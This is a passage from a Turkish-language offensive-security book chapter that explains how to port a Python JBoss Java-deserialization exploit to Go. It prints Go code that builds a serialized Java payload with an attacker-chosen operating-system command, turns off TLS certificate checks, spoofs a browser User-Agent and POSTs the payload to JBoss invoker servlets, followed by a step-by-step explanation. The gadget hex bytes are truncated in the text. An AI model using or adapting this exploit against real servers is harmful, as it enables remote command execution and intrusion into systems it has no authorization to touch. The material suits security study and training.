198      Bölüm 9

Ardından betik, işletim sistemi komutunun uzunluğunu hesaplar ve bu uzunluğu ve komutun kendisini `body_serObj` değişkenine ekler ❹. Betik, yükünüzün (payload) oluşturulmasını, Java serileştirilmiş nesnenizin geri kalanını temsil eden ek veriyi, JBoss’un işleyebileceği bir formatta ekleyerek tamamlar ❺. Yük oluşturulduktan sonra, betik URL’yi kurar ve gerekirse geçersiz sertifikaları yok sayacak şekilde SSL’i yapılandırır ❻. Sonrasında gerekli `Content-Type` ve `Content-Length` HTTP başlıklarını ayarlar ❼ ve hedef sunucuya kötü amaçlı isteği gönderir ❽.

Bu betikte sunulanların çoğu sizin için yeni olmamalı; büyük kısmını önceki bölümlerde ele aldık. Artık mesele, eşdeğer fonksiyon çağrılarını Go’ya uygun bir biçimde yapmak. Liste 9-4, sömürü kodunun (exploit) Go sürümünü gösteriyor.

```go
func jboss(host string, ssl bool, cmd string) (int, error) {
    serializedObject, err := hex.DecodeString("ACED0005737--SN/PPED FOR BREVITY-017400")
    if err != nil {
        return 0, err
    }

    serializedObject = append(serializedObject, byte(len(cmd)))
    serializedObject = append(serializedObject, []byte(cmd)...)
    afterBuf, err := hex.DecodeString("7000057865637571--SNIPPED FOR BREVITY-7E003A")
    if err != nil {
        return 0, err
    }
    serializedObject = append(serializedObject, afterBuf...)

    var client *http.Client
    var url string
    if ssl {
        client = &http.Client{
            Transport: &http.Transport{
                TLSClientConfig: &tls.Config{
                    InsecureSkipVerify: true,
                },
            },
        }
        url = fmt.Sprintf("https://%s/invoker/MInvokerServlet", host)
    } else {
        client = &http.Client{}
        url = fmt.Sprintf("http://%s/invoker/JMXInvokerServlet", host)
    }

    req, err := http.NewRequest("POST", url, bytes.NewReader(serializedObject))
    if err != nil {
        return 0, err
    }
    req.Header.Set(
        "User-Agent",
        "Mozilla/5.0 (Windows NT 6.1; W0W64; Trident/7.0; AS; rv:11.0) like Gecko")
    req.Header.Set(
        "Content-Type",
        "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue")

    resp, err := client.Do(req)
    if err != nil {
        return 0, err
    }

    return resp.StatusCode, nil
}
```

**Liste 9-4:** Orijinal Python serileştirme sömürüsünün Go karşılığı (`/ch-9/jboss/main.go`)

Kod neredeyse satır satır Python sürümünün birebir yeniden üretimi. Bu nedenle, açıklama notlarını Python’daki muadilleriyle hizaladık; böylece yaptığımız değişiklikleri rahatça takip edebileceksiniz.

İlk olarak, işletim sistemi komutunuzdan önce gelen kısmı sabit kodlayarak serileştirilmiş Java nesne `byte slice`’ınızı tanımlayarak yükünüzü oluşturursunuz ❶. Kullanıcı tanımlı mantığa güvenerek onaltılık (hexadecimal) dizgenizi bir bayt dizisine dönüştüren Python sürümünün aksine, Go sürümü `encoding/hex` paketindeki `hex.DecodeString()` fonksiyonunu kullanır. Sonrasında, işletim sistemi komutunuzun uzunluğunu belirler ve bu uzunluğu ve komutun kendisini yükünüze eklersiniz ❷. Yükünüzün oluşturulmasını, sabit kodlanmış onaltılık “trailer” dizgenizi mevcut yükünüzün üzerine çözerek (decode ederek) tamamlarsınız ❸. Bunun için yazılan kod, Python sürümüne kıyasla biraz daha uzun, çünkü bilinçli olarak ek hata işleme mantığı ekledik; ancak buna karşılık, Go’nun standart `encoding` paketini kullanarak onaltılık dizgenizi kolayca çözebiliyoruz.

Devamında HTTP istemcinizi ❹ başlatır, istenirse SSL haberleşmesi için yapılandırır ve ardından bir POST isteği oluşturursunuz. İsteği göndermeden önce, JBoss sunucusunun içerik türünü doğru şekilde yorumlamasını sağlamak üzere gerekli HTTP başlıklarını ❺ ayarlarsınız. `Content-Length` HTTP başlığını açıkça ayarlamadığınıza dikkat edin; bunun nedeni Go’nun `http` paketinin bunu sizin yerinize otomatik olarak yapması. Son olarak, kötü amaçlı isteğinizi `client.Do(req)` çağrısı ile gönderirsiniz ❻.

Genel olarak bu kod, şimdiye kadar öğrendiklerinizi kullanıyor. Kod, geçersiz sertifikaları yok sayacak şekilde SSL yapılandırmak ❼ ve belirli HTTP başlıkları eklemek ❽ gibi küçük değişiklikler içeriyor. Bu koddaki belki de tek yeni unsur, onaltılık bir dizgeyi eşdeğer bayt gösterimine çeviren Go çekirdek fonksiyonu `hex.DecodeString()` kullanımıdır. Python’da bunu manuel yapmanız gerekirdi. Tablo 9-2, yaygın olarak karşılaşılan bazı ek Python fonksiyonlarını veya yapıları ve bunların Go karşılıklarını gösteriyor.

Bu, işlevsel eşlemelerin kapsamlı bir listesi değildir. Sömürü kodlarını (exploit) taşırken (port ederken) ihtiyaç duyulabilecek tüm fonksiyonları kapsayacak kadar çok varyasyon ve uç durum vardır. Yine de bunun, en yaygın Python fonksiyonlarından en azından bir kısmını Go’ya çevirmenize yardımcı olmasını umuyoruz.

200     Bölüm 9

Tablo 9-2: Yaygın Python Fonksiyonları ve Bunların Go Karşılıkları
